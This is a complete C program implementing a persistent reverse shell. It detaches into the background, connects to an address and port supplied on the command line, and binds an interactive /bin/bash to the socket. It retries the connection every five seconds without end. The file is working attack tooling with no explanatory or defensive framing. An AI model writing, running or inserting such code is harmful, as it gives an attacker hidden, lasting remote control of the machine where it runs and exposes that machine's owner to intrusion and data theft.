#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define SHELL "/bin/bash"
#define MAX_BUF 1024

void error(char* err_msg)
{
    perror(err_msg);
    exit(1);
}

// This function checks if a port was selected in the argc
int chk_argno(int* argc)
{
    if (*argc < 3) {
        error((char*)"ERROR: indicate the server address and the port number!");
        exit(1);
    }

    return 0;
}

int create_socket()
{
    int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    fcntl(sockfd, F_SETFD, FD_CLOEXEC);

    return sockfd;
}

struct sockaddr_in create_serv_addr(char* argv[])
{
    struct sockaddr_in serv_addr;

    memset(&serv_addr, 0, sizeof(serv_addr)); // Initialize serv_addr with zeroes

    serv_addr.sin_family = AF_INET;                 // Domain
    serv_addr.sin_port = htons(atoi(argv[2]));      // Port
    serv_addr.sin_addr.s_addr = inet_addr(argv[1]); // IP Address

    return serv_addr;
}

int reconnect(int sockfd)
{
    close(sockfd);
    return create_socket();
}

int main(int argc, char* argv[])
{
    // PUTS PROGRAM ON BACKGROUND AND CHECK PORT NUMBER
    daemon(1, 0);
    chk_argno(&argc);

    struct sockaddr_in serv_addr = create_serv_addr(argv);

    int sockfd = create_socket();
    int status;

    bool conn_flag = false;
    void (*osighand)(int);

    pid_t pid;

infinite_loop:

    // Tries to connect to the server every 5 seconds until it succeds
    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) >= 0) {
        conn_flag = true;
        osighand = signal(SIGCHLD, SIG_DFL);

        if ((pid = fork()) == 0) {
            signal(SIGPIPE, SIG_DFL);

            for (int i = 0; i < 3; i++) {
                close(i);
                dup2(sockfd, i);
            }

            execl(SHELL, SHELL, "-i", (char*)NULL);
        }
    } else {
        //  If it doesnt connect it tries again in 5 seconds
        sleep(5);
    }

    // If connection is lost...
    if (conn_flag) {
        while (waitpid(pid, &status, 0) == -1) {
        }

        signal(SIGCHLD, osighand);

        kill(pid, SIGKILL);

        conn_flag = !conn_flag;
        sockfd = reconnect(sockfd);
    }

    goto infinite_loop;
    return 0;
}
